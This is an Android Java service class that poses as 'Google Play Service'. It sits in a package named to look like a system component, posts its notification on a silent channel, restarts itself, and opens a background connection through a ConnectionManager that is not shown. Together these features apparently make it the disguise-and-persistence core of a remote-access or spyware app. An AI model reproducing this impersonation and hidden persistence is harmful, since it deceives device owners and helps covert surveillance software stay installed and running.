package com.android.background.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

public class MainService extends Service {

    public static final String CHANNEL_ID = BuildConfig.APPLICATION_ID;
    private static Context contextOfApplication;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        createNotificationChannel();

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, CHANNEL_ID);

        Notification notification = notificationBuilder.setContentTitle("Google Play Service")
                .setContentText("Google Background Service")
                .setSmallIcon(R.drawable.play_service_icon)
                .setOngoing(true)
                .build();
        startForeground(1, notification);

        contextOfApplication = this;
        ConnectionManager.startAsync(this);

//        printAnything();

        return Service.START_STICKY;
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
    }


    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }

    private void createNotificationChannel() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Google Background Service Channel",
                    NotificationManager.IMPORTANCE_NONE
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }




    private void printAnything() {

        new Thread(new Runnable() {
            @Override
            public void run() {
                int i = 0;
                while (true){
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    Log.d("NurAlam", ""+i);
                    i++;
                }
            }
        }).start();
    }
}
